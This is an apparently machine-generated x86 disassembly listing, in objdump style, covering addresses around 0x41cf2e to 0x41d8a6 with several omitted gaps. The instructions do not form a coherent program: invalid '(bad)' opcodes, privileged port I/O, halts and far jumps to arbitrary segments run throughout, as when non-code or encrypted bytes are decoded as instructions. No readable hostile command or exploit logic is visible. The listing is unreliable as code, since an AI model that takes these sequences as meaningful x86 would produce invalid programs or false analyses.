  41cf2e:	and    cl,dh
  41cf30:	jno    0x41cec8
  41cf32:	xor    ah,BYTE PTR [ecx+0x7e]
  41cf35:	test   eax,0x54c40335
  41cf3a:	or     al,BYTE PTR [ebx]
  41cf3c:	push   es
  41cf3d:	hlt    
  41cf3e:	jge    0x41cf1e
  41cf40:	jmp    0x41cf39
  41cf42:	add    BYTE PTR [ebp-0x13],0x21
  41cf46:	daa    
  41cf47:	or     BYTE PTR [esi+0x4a4dffa1],bl
  41cf4d:	add    DWORD PTR [ebx+0x1b],eax
  41cf50:	call   0x2be0a2af
  41cf55:	out    dx,eax
  41cf56:	repnz stos BYTE PTR es:[edi],al
  41cf58:	pop    ds
  41cf59:	popa   
  41cf5a:	aas    
  41cf5b:	mov    esi,0xc78ee05c
  41cf60:	sti    
  41cf61:	sti    
  41cf62:	dec    edx
  41cf63:	repnz mov WORD PTR [ebp-0x6544eeb5],es
  41cf6a:	ret    
  41cf6b:	dec    esp
  41cf6c:	sbb    cl,BYTE PTR [ebp-0x68]
  41cf6f:	stos   DWORD PTR es:[edi],eax
  41cf70:	enter  0xd283,0x1e
  41cf74:	sub    DWORD PTR [edi-0x3d],0x35
  41cf78:	aaa    
  41cf79:	pop    ds
  41cf7a:	data16 xchg BYTE PTR [esi+0x59],dh
  41cf7e:	out    0x12,eax
  41cf80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cf81:	add    edi,esp
  41cf83:	scas   eax,DWORD PTR es:[edi]
  41cf84:	nop
  41cf85:	mov    ebp,DWORD PTR [eax+0x7b]
  41cf88:	iret   
  41cf89:	sbb    dh,BYTE PTR [ebx+0x4ee613b6]
  41cf8f:	sbb    al,0x11
  41cf91:	pop    esi
  41cf92:	mov    esi,0x3c32a05
  41cf97:	add    al,0xe
  41cf99:	dec    ebx
  41cf9a:	in     eax,0x11
  41cf9c:	bnd ret 0x5202
  41cfa0:	mov    ah,ah
  41cfa2:	jnp    0x41cf34
  41cfa4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cfa5:	inc    ebx
  41cfa6:	repnz cwde 
  41cfa8:	and    ecx,DWORD PTR [ecx-0x6bbc1e94]
  41cfae:	mov    dl,0x5
  41cfb0:	das    
  41cfb1:	cdq    
  41cfb2:	mov    edx,0x8d51
	...
  41d013:	add    BYTE PTR [eax],al
  41d015:	add    BYTE PTR [ecx-0x52bcdfcc],bh
  41d01b:	push   edi
  41d01c:	sti    
  41d01d:	(bad)  
  41d01e:	das    
  41d01f:	ret    
  41d020:	lods   al,BYTE PTR ds:[esi]
  41d021:	daa    
  41d022:	nop
  41d023:	rcl    BYTE PTR [esi],cl
  41d025:	push   ss
  41d026:	xchg   esp,eax
  41d027:	xor    al,BYTE PTR [ecx]
  41d029:	add    BYTE PTR [edi],al
  41d02b:	add    DWORD PTR [eax],eax
  41d02d:	add    BYTE PTR [esi-0x40],ah
  41d030:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d031:	pop    es
  41d032:	or     BYTE PTR [esi+0x20],ah
  41d035:	push   edx
  41d036:	call   FWORD PTR [eax-0x6a]
  41d039:	popa   
  41d03a:	nop
  41d03b:	push   esp
  41d03c:	and    BYTE PTR [ecx+eax*8-0x1e],dh
  41d040:	and    DWORD PTR [ecx+0xceed3f8],0xf7b22811
  41d04a:	xchg   esp,edi
  41d04c:	add    al,ah
  41d04e:	xchg   ecx,eax
  41d04f:	icebp  
  41d050:	xor    esi,DWORD PTR [eax+eax*1]
  41d053:	jno    0x41d036
  41d055:	cmp    DWORD PTR [esi-0x477e7b24],eax
  41d05b:	cmp    BYTE PTR [ebx+0x4a],0xcf
  41d05f:	or     bl,ah
  41d061:	mov    ebx,0xf2989fea
  41d066:	stos   DWORD PTR es:[edi],eax
  41d067:	ja     0x41d00f
  41d069:	std    
  41d06a:	ins    BYTE PTR es:[edi],dx
  41d06b:	sub    edx,DWORD PTR [ebp+edi*1-0x68aa8a9e]
  41d072:	stc    
  41d073:	mov    ebp,0x4b1ec9e1
  41d078:	gs mov dh,0xfe
  41d07b:	sbb    al,0x8
  41d07d:	subps  xmm0,XMMWORD PTR [edi-0x365c9d90]
  41d084:	fstp   TBYTE PTR [esp+eax*8]
  41d087:	daa    
  41d088:	mov    DWORD PTR [ebp+0x20],ecx
  41d08b:	dec    ecx
  41d08c:	push   ds
  41d08d:	int3   
  41d08e:	or     BYTE PTR [ebp+0x2b],ah
  41d091:	fwait
  41d092:	mov    esi,0x8cfcf5c9
  41d097:	out    0xb8,eax
  41d099:	scas   eax,DWORD PTR es:[edi]
  41d09a:	mov    esp,0x4c6ca35c
  41d09f:	scas   al,BYTE PTR es:[edi]
  41d0a0:	(bad)  
  41d0a1:	out    dx,al
  41d0a2:	inc    ebp
  41d0a3:	in     al,0xcf
  41d0a5:	ins    BYTE PTR es:[edi],dx
  41d0a6:	je     0x41d0c1
  41d0a8:	push   edx
  41d0a9:	sub    al,BYTE PTR [ecx*1+0x7a39df06]
  41d0b0:	mov    edx,0x9b240224
  41d0b5:	stc    
  41d0b6:	xor    eax,DWORD PTR [edi-0x13edcb86]
  41d0bc:	pop    edi
  41d0bd:	jo     0x41d069
  41d0bf:	ss adc eax,0x345ffa0d
  41d0c5:	mov    ds:0x42e63d8d,al
  41d0ca:	mov    esi,DWORD PTR [si]
  41d0cd:	das    
  41d0ce:	ror    DWORD PTR [ecx-0xe],1
  41d0d1:	push   eax
  41d0d2:	mov    ebp,0x81754f67
  41d0d7:	div    BYTE PTR [eax]
  41d0d9:	inc    ebp
  41d0da:	inc    ebx
  41d0db:	popf   
  41d0dc:	mov    bl,0x87
  41d0de:	jl     0x41d147
  41d0e0:	adc    al,0x9e
  41d0e2:	call   0x5e8a30bf
  41d0e7:	pop    esp
  41d0e8:	sub    al,0x4d
  41d0ea:	(bad)  
  41d0ec:	in     eax,0xc0
  41d0ee:	or     eax,ebx
  41d0f0:	add    DWORD PTR [ebx],0xffffffa7
  41d0f3:	ret    
  41d0f4:	lahf   
  41d0f5:	inc    ebp
  41d0f6:	xchg   esi,eax
  41d0f7:	retf   0x51d1
  41d0fa:	jne    0x41d162
  41d0fc:	mov    ebp,DWORD PTR [edx+ebp*4-0x1eb14291]
  41d103:	cdq    
  41d104:	xchg   ecx,eax
  41d105:	dec    edi
  41d106:	adc    al,0x32
  41d109:	fnstenv [ecx-0x7fbb981c]
  41d10f:	jmp    FWORD PTR [edx]
  41d111:	std    
  41d112:	mov    BYTE PTR [esi-0x39],bh
  41d115:	sbb    DWORD PTR [eax+0xf82a4d9],ebx
  41d11b:	(bad)  
  41d11c:	jb     0x41d143
  41d11e:	mov    ds:0x18c188fd,eax
  41d123:	fs or  eax,0xfca960ba
  41d129:	pop    esp
  41d12a:	sbb    dl,ah
  41d12c:	in     al,dx
  41d12d:	loope  0x41d0fb
  41d12f:	aaa    
  41d130:	out    0xb,eax
  41d132:	rol    DWORD PTR [edx-0x7e],cl
	...
  41d195:	add    BYTE PTR [eax-0x3d],dl
  41d198:	cmp    ecx,DWORD PTR ds:0xdf76fdbb
  41d19e:	sti    
  41d19f:	aad    0x81
  41d1a1:	loopne 0x41d1be
  41d1a3:	mov    bl,0x5e
  41d1a5:	pop    edi
  41d1a6:	fwait
  41d1a7:	xor    eax,DWORD PTR [ecx]
  41d1a9:	add    BYTE PTR [edi],al
  41d1ab:	add    DWORD PTR [eax],eax
  41d1ad:	add    BYTE PTR [ecx-0x48],dl
  41d1b0:	cmp    al,0x38
  41d1b2:	pushf  
  41d1b3:	or     eax,0xb8382950
  41d1b8:	pop    esi
  41d1b9:	fwait
  41d1ba:	dec    esp
  41d1bb:	xor    BYTE PTR [edx+0x4e],0xbc
  41d1bf:	int    0xbf
  41d1c1:	xchg   ecx,eax
  41d1c2:	push   0xea27b25d
  41d1c7:	pop    eax
  41d1c8:	lock adc edi,esi
  41d1cb:	repnz enter 0x662b,0x4e
  41d1d0:	(bad)  
  41d1d1:	xlat   BYTE PTR ds:[ebx]
  41d1d2:	mov    eax,0x91541260
  41d1d7:	bound  ecx,QWORD PTR [edx-0x3b]
  41d1da:	stos   BYTE PTR es:[edi],al
  41d1db:	mov    ebp,0x2c942430
  41d1e0:	jl     0x41d18c
  41d1e2:	add    eax,0x28db3dcc
  41d1e7:	mov    eax,DWORD PTR [ecx]
  41d1e9:	loop   0x41d202
  41d1eb:	fsubr  DWORD PTR [ecx-0x602f1500]
  41d1f1:	not    DWORD PTR [eax-0x60c6e74a]
  41d1f7:	adc    ecx,esi
  41d1f9:	sbb    al,0xf
  41d1fb:	cmp    eax,0xbf5ffe1e
  41d200:	hlt    
  41d201:	lods   eax,DWORD PTR ds:[esi]
  41d202:	mov    dh,0xef
  41d204:	mov    bh,0x34
  41d206:	out    dx,al
  41d207:	ror    BYTE PTR [ebp+0xa7d01d1],cl
  41d20d:	add    DWORD PTR [ebx+0x43bf1863],eax
  41d213:	sti    
  41d214:	dec    eax
  41d215:	test   DWORD PTR [esp+esi*8+0x5ac65c05],0x77c6e90b
  41d220:	pop    es
  41d221:	out    dx,al
  41d222:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d223:	and    eax,0xf195b9fb
  41d228:	test   DWORD PTR [edi+ecx*4+0xcf98a72],ebx
  41d22f:	dec    edx
  41d230:	out    dx,al
  41d231:	inc    edx
  41d232:	pop    es
  41d233:	inc    esp
  41d234:	sbb    al,0xc8
  41d236:	scas   eax,DWORD PTR es:[edi]
  41d237:	in     eax,0x9
  41d239:	xor    BYTE PTR [eax+edi*1-0x36],dl
  41d23d:	(bad)  
  41d23e:	mov    ch,0x1d
  41d240:	mov    edx,0x97d7d881
  41d245:	aad    0x96
  41d247:	and    dh,BYTE PTR [edx]
  41d249:	jmp    0xb05fb9d3
  41d24e:	push   ds
  41d24f:	xlat   BYTE PTR ds:[ebx]
  41d250:	clc    
  41d251:	sub    ch,bl
  41d253:	das    
  41d254:	sbb    esi,ebx
  41d256:	inc    edx
  41d257:	xor    ecx,esi
  41d259:	popf   
  41d25a:	call   0x58e0cc27
  41d25f:	xchg   edx,eax
  41d260:	mov    bh,0x9a
  41d262:	xor    eax,DWORD PTR ds:0xd2b108bc
  41d268:	mov    bl,BYTE PTR [edx]
  41d26a:	lahf   
  41d26b:	icebp  
  41d26c:	push   ebp
  41d26d:	xor    bh,ch
  41d26f:	mov    ecx,0x4fc6e07f
  41d274:	pushf  
  41d275:	jmp    0x41d2eb
  41d277:	jmp    0xebf8:0x66c3b514
  41d27e:	popf   
  41d27f:	sbb    bh,BYTE PTR [ebp+eiz*8+0x692b9e07]
  41d286:	nop
  41d287:	out    0x67,eax
  41d289:	sbb    DWORD PTR [eax+ebp*1+0x55],ebp
  41d28d:	xchg   ecx,eax
  41d28e:	push   edi
  41d28f:	jge    0x41d240
  41d291:	mov    bh,bh
  41d293:	push   0x4a
  41d295:	mov    es,WORD PTR [ebp-0x6c030415]
  41d29b:	and    eax,0xe4503642
  41d2a0:	cmp    esi,0xffffffbd
  41d2a3:	xchg   DWORD PTR [edx],eax
  41d2a5:	cs dec edi
  41d2a7:	stos   BYTE PTR es:[edi],al
  41d2a8:	ficomp WORD PTR [esi+0xb994fe7]
  41d2ae:	mov    esp,0x68a1d9d8
  41d2b3:	dec    edi
  41d2b4:	or     al,0x0
	...
  41d316:	inc    BYTE PTR [eax+0x7dff54f9]
  41d31c:	jmp    FWORD PTR [edx-0x7a8154e8]
  41d322:	sbb    eax,0xa296a984
  41d327:	xor    al,0x1
  41d329:	add    BYTE PTR [edi],al
  41d32b:	add    DWORD PTR [eax],eax
  41d32d:	add    BYTE PTR [edx-0x2c0643f6],dh
  41d333:	add    bl,BYTE PTR [esp+ecx*4-0x505a962b]
  41d33a:	cmp    eax,0xbfdf55fa
  41d33f:	add    al,BYTE PTR [eax]
  41d341:	bnd ret 0xade6
  41d345:	data16 (bad) 
  41d348:	rcr    BYTE PTR [ecx-0x75e3257d],0xe7
  41d34f:	cmp    eax,0xfabd1026
  41d354:	adc    eax,0x9f1bbb45
  41d359:	dec    ecx
  41d35a:	xor    DWORD PTR [ebp+0x71],0x4286452e
  41d361:	dec    esi
  41d362:	call   0x88b4:0x45dbdda7
  41d369:	mov    edx,0xb5d3ff88
  41d36e:	xchg   ebx,eax
  41d36f:	xor    eax,0x9a31f600
  41d374:	imul   ebx,DWORD PTR [eax+0x66],0xfa584afc
  41d37b:	out    dx,al
  41d37c:	sar    BYTE PTR [esi],cl
  41d37e:	hlt    
  41d37f:	sbb    esp,DWORD PTR [ebx-0x59]
  41d382:	jae    0x41d344
  41d384:	or     DWORD PTR [esi-0x48ee97cf],ebp
  41d38a:	clc    
  41d38b:	xchg   ah,cl
  41d38d:	mov    ebx,0xfd18c1d5
  41d392:	repnz dec ebp
  41d394:	shl    DWORD PTR [edi-0x15],0x93
  41d398:	imul   esi,edi,0x76
  41d39b:	stos   BYTE PTR es:[edi],al
  41d39c:	cmc    
  41d39d:	pop    edi
  41d39e:	ins    DWORD PTR es:[edi],dx
  41d39f:	sbb    ch,BYTE PTR [edx+0x75]
  41d3a2:	inc    esp
  41d3a3:	sub    ebx,DWORD PTR [edx+0x2b]
  41d3a6:	mov    dh,0x24
  41d3a8:	and    bh,BYTE PTR [esp+edi*1]
  41d3ab:	ja     0x41d3bd
  41d3ad:	and    ah,BYTE PTR [edx]
  41d3af:	stos   DWORD PTR es:[edi],eax
  41d3b0:	outs   dx,BYTE PTR ds:[esi]
  41d3b1:	pop    ds
  41d3b2:	int3   
  41d3b3:	mov    esp,0x77141199
  41d3b8:	jns    0x41d33c
  41d3ba:	lods   al,BYTE PTR ds:[esi]
  41d3bb:	cli    
  41d3bc:	push   ds
  41d3bd:	fmulp  st(0),st
  41d3bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d3c0:	outs   dx,DWORD PTR ds:[esi]
  41d3c1:	push   ebx
  41d3c2:	sub    eax,0x2630649c
  41d3c7:	inc    ebp
  41d3c8:	inc    eax
  41d3c9:	ret    
  41d3ca:	ret    
  41d3cb:	and    BYTE PTR [eax],0x52
  41d3ce:	nop
  41d3cf:	xlat   BYTE PTR ds:[ebx]
  41d3d0:	dec    ebp
  41d3d1:	aaa    
  41d3d2:	xchg   edi,eax
  41d3d3:	enter  0x69dd,0xe0
  41d3d7:	xchg   edi,eax
  41d3d8:	cmp    ch,BYTE PTR [ebp+0x56a5e2c5]
  41d3de:	leave  
  41d3df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d3e0:	mov    eax,0x927e2afe
  41d3e5:	mov    esi,DWORD PTR gs:[eax-0x303eb7ab]
  41d3ec:	aaa    
  41d3ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d3ee:	(bad)  
  41d3ef:	and    DWORD PTR [ebx+0x63805b16],0xb02c474f
  41d3f9:	pop    ss
  41d3fa:	sahf   
  41d3fb:	out    dx,al
  41d3fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d3fd:	stos   DWORD PTR es:[edi],eax
  41d3fe:	inc    DWORD PTR [ebx+ecx*8+0x5b704281]
  41d405:	sbb    DWORD PTR [esi+edx*4-0x18a8e996],ecx
  41d40c:	mov    esp,ds
  41d40e:	add    eax,0x28dcd220
  41d413:	aad    0x43
  41d415:	fimul  WORD PTR ds:0x98e83fd2
  41d41b:	stos   DWORD PTR es:[edi],eax
  41d41c:	xchg   esp,eax
  41d41d:	inc    esi
  41d41e:	jbe    0x41d3e8
  41d420:	mov    edx,0x395509de
  41d425:	(bad)  
  41d426:	dec    dh
  41d428:	xor    dh,ah
  41d42a:	sahf   
  41d42b:	ds and eax,0xd4698d81
  41d431:	push   ss
  41d432:	xor    eax,0x288c
	...
  41d493:	add    BYTE PTR [eax],al
  41d495:	add    dh,dh
  41d497:	rcl    BYTE PTR ss:[edx+edx*8-0x2e89090c],cl
  41d49f:	fwait
  41d4a0:	aad    0xa2
  41d4a2:	bound  ecx,QWORD PTR [ebx+0x35a963c4]
  41d4a8:	add    DWORD PTR [eax],eax
  41d4aa:	pop    es
  41d4ab:	add    DWORD PTR [eax],eax
  41d4ad:	add    al,dh
  41d4af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d4b0:	pop    ds
  41d4b1:	inc    edx
  41d4b2:	jmp    0x90de:0x88099c92
  41d4b9:	jge    0x41d470
  41d4bb:	std    
  41d4bc:	or     DWORD PTR [ebp-0x71],edx
  41d4bf:	pop    ebp
  41d4c0:	js     0x41d4dc
  41d4c2:	int    0xa5
  41d4c4:	(bad)  
  41d4c5:	(bad)  
  41d4c7:	int    0x2d
  41d4c9:	mov    esp,0xeca5dc78
  41d4ce:	mov    ds:0xfddc8e60,eax
  41d4d3:	cmp    al,0x74
  41d4d5:	pop    ebp
  41d4d6:	out    0x81,eax
  41d4d8:	enter  0x85bc,0x98
  41d4dc:	fist   DWORD PTR [esi-0x47]
  41d4df:	cdq    
  41d4e0:	fadd   DWORD PTR [edi-0x3e]
  41d4e3:	pop    edi
  41d4e4:	stos   DWORD PTR es:[edi],eax
  41d4e5:	jp     0x41d4fa
  41d4e7:	fstp   DWORD PTR [eax+0x55]
  41d4ea:	push   esi
  41d4eb:	jmp    0x4f30:0x534eb0c2
  41d4f2:	shl    DWORD PTR [ebx+0x62555d63],0x7a
  41d4f9:	dec    ecx
  41d4fa:	dec    esp
  41d4fb:	push   edi
  41d4fc:	dec    eax
  41d4fd:	mov    gs,WORD PTR [eax-0x5a74d308]
  41d503:	popa   
  41d504:	mov    ds:0x291a1039,al
  41d509:	push   ecx
  41d50a:	mov    eax,ds:0xceb002a8
  41d50f:	pop    esp
  41d510:	nop
  41d511:	adc    DWORD PTR [ecx+0x33],esi
  41d514:	cmc    
  41d515:	in     eax,0xb6
  41d517:	push   ebx
  41d518:	xor    dh,cl
  41d51a:	mov    ebp,0x26aaae02
  41d51f:	dec    edi
  41d520:	cmp    ch,ah
  41d522:	mov    dl,0xe0
  41d524:	pop    ds
  41d525:	(bad)  
  41d526:	repnz mov eax,0xa9df718
  41d52c:	or     BYTE PTR [edx],cl
  41d52e:	sub    edx,esi
  41d530:	xor    ah,cl
  41d532:	in     eax,dx
  41d533:	neg    BYTE PTR [ebx]
  41d535:	inc    ebp
  41d536:	fstp   st(5)
  41d538:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d539:	fiadd  WORD PTR [eax+0x2468b13d]
  41d53f:	jge    0x41d50a
  41d541:	pop    eax
  41d542:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  41d544:	les    edx,FWORD PTR [edi+ebp*1+0x586e770c]
  41d54b:	bound  eax,QWORD PTR [esi+ecx*8]
  41d54e:	pop    ss
  41d54f:	lds    esp,FWORD PTR ds:0x83bc262a
  41d555:	dec    ebx
  41d556:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d557:	xchg   edi,eax
  41d558:	arpl   WORD PTR [ebx+0x52cd6daf],bp
  41d55e:	jbe    0x41d5c5
  41d560:	mov    bh,0x20
  41d562:	or     DWORD PTR [eax-0x14],eax
  41d565:	jo     0x41d4f3
  41d567:	add    DWORD PTR [eax],ecx
  41d569:	jmp    0x1117:0xfa88d59a
  41d570:	pop    ds
  41d571:	add    eax,esp
  41d573:	lods   eax,DWORD PTR ds:[esi]
  41d574:	mov    ds:0x8cb6588a,eax
  41d579:	and    eax,0x94d12001
  41d57e:	scas   eax,DWORD PTR es:[edi]
  41d57f:	and    ebx,eax
  41d581:	xor    edi,DWORD PTR [eax-0x26]
  41d584:	adc    DWORD PTR [edi+esi*4],ebx
  41d587:	arpl   WORD PTR [ebx-0x704c72df],di
  41d58d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d58e:	idiv   ebx
  41d590:	inc    edx
  41d591:	add    bl,BYTE PTR [esi-0x110b56b6]
  41d597:	push   edx
  41d598:	jp     0x41d5af
  41d59a:	stc    
  41d59b:	pop    ebp
  41d59c:	and    BYTE PTR [ebx+edi*8],cl
  41d59f:	and    DWORD PTR [ebp-0x2c],esi
  41d5a2:	cmp    BYTE PTR [esi-0x5e27bb98],bh
  41d5a8:	out    dx,al
  41d5a9:	test   DWORD PTR [edx+0x6e0d269d],esp
  41d5af:	sbb    al,0x2d
  41d5b1:	xchg   edi,eax
  41d5b2:	cmp    eax,ecx
  41d5b4:	stos   BYTE PTR es:[edi],al
	...
  41d615:	add    BYTE PTR [ecx+ebx*4+0x4c],bh
  41d619:	jbe    0x41d608
  41d61b:	idiv   DWORD PTR [esi-0x65]
  41d61e:	mov    al,BYTE PTR [edi+0x5fccd221]
  41d624:	aas    
  41d625:	push   ebx
  41d626:	mov    al,0x36
  41d628:	add    DWORD PTR [eax],eax
  41d62a:	pop    es
  41d62b:	add    DWORD PTR [eax],eax
  41d62d:	add    BYTE PTR [ebp-0x78651cb5],dl
  41d633:	into   
  41d634:	stos   BYTE PTR es:[edi],al
  41d635:	and    ecx,edi
  41d637:	aas    
  41d638:	cld    
  41d639:	cdq    
  41d63a:	adc    al,0xa9
  41d63c:	jmp    FWORD PTR [edi]
  41d63e:	mov    esp,db2
  41d641:	jbe    0x41d62c
  41d643:	mov    BYTE PTR [ebp-0x4cb48053],ah
  41d649:	je     0x41d6a2
  41d64b:	adc    dl,BYTE PTR [eax]
  41d64d:	ss aas 
  41d64f:	addr16 je 0x41d6b2
  41d652:	and    edx,DWORD PTR [edx-0x630225f7]
  41d658:	pop    ebx
  41d659:	imul   edi,eax,0x7
  41d65c:	cdq    
  41d65d:	(bad)  
  41d65e:	cwde   
  41d65f:	ss loop 0x41d604
  41d662:	(bad)  [esp+ebp*8]
  41d665:	xlat   BYTE PTR ds:[ebx]
  41d666:	idiv   BYTE PTR [edx-0xb]
  41d669:	cdq    
  41d66a:	aam    0xba
  41d66c:	pop    ebp
  41d66d:	imul   esp,DWORD PTR [eax-0x5f0def07],0x3152a576
  41d677:	jecxz  0x41d688
  41d679:	dec    ebp
  41d67a:	or     DWORD PTR [bp-0x2b47],ebx
  41d67f:	adc    DWORD PTR [esi-0x3f],ebx
  41d682:	sbb    BYTE PTR [edx],dh
  41d684:	js     0x41d6da
  41d686:	fisubr WORD PTR [ebx]
  41d688:	push   ebp
  41d689:	pop    esp
  41d68a:	add    DWORD PTR [eax-0x6ee310cf],edx
  41d690:	inc    esi
  41d691:	cld    
  41d692:	xor    eax,0xc68aaed5
  41d697:	sbb    BYTE PTR [ebx],0x43
  41d69a:	(bad)  
  41d69b:	popa   
  41d69c:	add    dh,dh
  41d69e:	or     bl,BYTE PTR [edi]
  41d6a0:	imul   edx,DWORD PTR [ebx],0x782fa34
  41d6a6:	(bad)  
  41d6a7:	out    0x41,eax
  41d6a9:	mov    al,ds:0x7346faac
  41d6ae:	cmp    al,0x2a
  41d6b0:	mov    eax,ds:0xb1c96afb
  41d6b5:	jae    0x41d641
  41d6b7:	clc    
  41d6b8:	repnz fisttp DWORD PTR [esi]
  41d6bb:	push   ss
  41d6bc:	fldenv [edx+0x50]
  41d6bf:	jmp    FWORD PTR [esi-0x6b]
  41d6c2:	or     ebx,DWORD PTR [esi-0x69]
  41d6c5:	xchg   DWORD PTR [ebx],eax
  41d6c7:	sub    dl,BYTE PTR [esi-0x2d6bbbc9]
  41d6cd:	sub    esp,DWORD PTR [eax+0x4fa1813e]
  41d6d3:	xchg   ecx,eax
  41d6d4:	out    dx,al
  41d6d5:	(bad)  
  41d6d6:	out    dx,al
  41d6d7:	xchg   edx,eax
  41d6d8:	in     eax,dx
  41d6d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d6da:	jo     0x41d6fe
  41d6dc:	push   eax
  41d6dd:	inc    ebp
  41d6de:	dec    eax
  41d6df:	cdq    
  41d6e0:	add    DWORD PTR [ebp+0x6b192c57],esp
  41d6e6:	outs   dx,DWORD PTR ds:[esi]
  41d6e7:	aas    
  41d6e8:	aas    
  41d6e9:	fisttp QWORD PTR [ebx+0x4e5ebc9d]
  41d6ef:	cmc    
  41d6f0:	jge    0x41d69a
  41d6f2:	stc    
  41d6f3:	mov    cl,dl
  41d6f5:	lahf   
  41d6f6:	pushf  
  41d6f7:	sub    BYTE PTR [ebx+0xd],0x6e
  41d6fb:	xor    eax,0x840251dc
  41d700:	stc    
  41d701:	repz gs je 0x41d6a2
  41d705:	inc    ecx
  41d706:	mov    dl,0xd
  41d708:	jae    0x41d742
  41d70a:	nop
  41d70b:	jg     0x41d773
  41d70d:	neg    ch
  41d70f:	(bad)  
  41d710:	lock and eax,0x84746731
  41d716:	jle    0x41d76a
  41d718:	pop    edx
  41d719:	lods   eax,DWORD PTR ds:[esi]
  41d71a:	ret    
  41d71b:	dec    ecx
  41d71c:	fdivr  st(5),st
  41d71e:	cmp    al,0x5f
  41d720:	dec    esi
  41d721:	add    DWORD PTR [ebx+0x13],eax
  41d724:	sbb    al,0xac
  41d726:	test   al,0x86
  41d728:	ins    DWORD PTR es:[edi],dx
  41d729:	pop    esp
  41d72a:	fcom   DWORD PTR [esi]
  41d72c:	add    DWORD PTR [edx+0x3e490d3e],ebx
  41d732:	gs xchg edx,eax
  41d734:	jge    0x41d736
	...
  41d796:	and    al,0xce
  41d798:	outs   dx,BYTE PTR ds:[esi]
  41d799:	sub    ch,dh
  41d79b:	stos   BYTE PTR es:[edi],al
  41d79c:	fs into 
  41d79e:	push   ecx
  41d79f:	pop    ebp
  41d7a0:	or     esp,edi
  41d7a2:	and    ebx,DWORD PTR [edi]
  41d7a4:	sbb    DWORD PTR ds:0x137b7,ebx
  41d7aa:	pop    es
  41d7ab:	add    DWORD PTR [eax],eax
  41d7ad:	add    BYTE PTR [ebx],al
  41d7af:	popf   
  41d7b0:	cs xor ch,dl
  41d7b3:	mov    edx,DWORD PTR [esi-0x105a06ee]
  41d7b9:	fdivr  DWORD PTR [ecx-0x4a]
  41d7bc:	sub    edi,ebx
  41d7be:	push   ecx
  41d7bf:	out    0xdd,eax
  41d7c1:	rcl    DWORD PTR [edx],1
  41d7c3:	or     eax,0x14612c28
  41d7c8:	arpl   dx,sp
  41d7ca:	push   esp
  41d7cb:	lods   al,BYTE PTR ds:[esi]
  41d7cc:	jp     0x41d7db
  41d7ce:	repnz lahf 
  41d7d0:	out    dx,eax
  41d7d1:	lahf   
  41d7d2:	loopne 0x41d776
  41d7d4:	mov    esi,0xbc806f01
  41d7d9:	jge    0x41d7b9
  41d7db:	int3   
  41d7dc:	dec    ecx
  41d7dd:	xor    dl,dl
  41d7df:	xor    DWORD PTR [eax-0x6d95ce92],esp
  41d7e5:	mov    es,WORD PTR [ebp+0x3b]
  41d7e8:	call   DWORD PTR [edx]
  41d7ea:	or     BYTE PTR [ecx+0x39],ch
  41d7ed:	jp     0x41d7b7
  41d7ef:	loopne 0x41d80d
  41d7f1:	pushf  
  41d7f2:	sbb    edi,DWORD PTR [ebp-0x60]
  41d7f5:	or     DWORD PTR [edi+ebx*1],eax
  41d7f8:	aam    0xe2
  41d7fa:	and    BYTE PTR [edx+eax*8+0x37],bl
  41d7fe:	cmp    BYTE PTR [ecx+0x7],ch
  41d801:	sbb    BYTE PTR ds:0xd7a75397,ch
  41d807:	fwait
  41d808:	or     DWORD PTR [edx+0x47],ecx
  41d80b:	cmp    al,al
  41d80d:	sbb    BYTE PTR [eax+0x56],bl
  41d810:	inc    ebp
  41d811:	int    0x80
  41d813:	neg    DWORD PTR [ecx-0x6af603a7]
  41d819:	xchg   DWORD PTR [edx+0x6],ebp
  41d81c:	rol    ecx,1
  41d81e:	popf   
  41d81f:	sbb    ebx,DWORD PTR [esi+0x17af8610]
  41d825:	xor    ah,BYTE PTR [ebx]
  41d827:	pop    edi
  41d828:	and    esi,DWORD PTR [ebx]
  41d82a:	dec    edx
  41d82b:	push   es
  41d82c:	push   eax
  41d82d:	xchg   ebx,eax
  41d82e:	jmp    0xa7bc:0x2fda993e
  41d835:	(bad)  
  41d836:	lahf   
  41d837:	mov    ch,0x2d
  41d839:	lds    ebx,FWORD PTR [esi+0x10]
  41d83c:	mov    dl,BYTE PTR [edx+eiz*2]
  41d83f:	ror    DWORD PTR [ecx+0x11],1
  41d842:	cli    
  41d843:	push   0x58973191
  41d848:	cmp    al,0x46
  41d84a:	dec    esi
  41d84b:	and    eax,0x8218b159
  41d850:	mov    ah,BYTE PTR [eax+eiz*8-0x5]
  41d854:	jbe    0x41d8d0
  41d856:	mov    ch,0x50
  41d858:	retf   
  41d859:	or     esp,ebp
  41d85b:	adc    ah,BYTE PTR [ebp-0x481080db]
  41d861:	sub    BYTE PTR [ecx+0x33107ba9],0x9f
  41d868:	pusha  
  41d869:	mov    cl,0xb0
  41d86b:	test   BYTE PTR [ebp-0x69f2bef1],al
  41d871:	xchg   ebx,eax
  41d872:	outs   dx,BYTE PTR ds:[esi]
  41d873:	or     al,0xa
  41d875:	iret   
  41d876:	dec    edx
  41d877:	or     al,0x50
  41d879:	adc    bl,BYTE PTR [esi-0x6ffc14f9]
  41d87f:	pop    edi
  41d880:	rcl    DWORD PTR [edx-0x41],1
  41d883:	jmp    FWORD PTR [ebp+0x47]
  41d886:	push   edx
  41d887:	outs   dx,BYTE PTR ds:[esi]
  41d888:	int3   
  41d889:	bound  esp,QWORD PTR [edi-0xcc14a77]
  41d88f:	jne    0x41d836
  41d891:	xchg   esp,eax
  41d892:	push   ecx
  41d893:	int3   
  41d894:	and    eax,0xd9cb139f
  41d899:	lea    esp,ds:0x2ed65841
  41d89f:	cs in  al,dx
  41d8a1:	int    0xd5
  41d8a3:	bound  ebx,QWORD PTR [esi]
  41d8a5:	popf   
  41d8a6:	fdivrp st(2),st
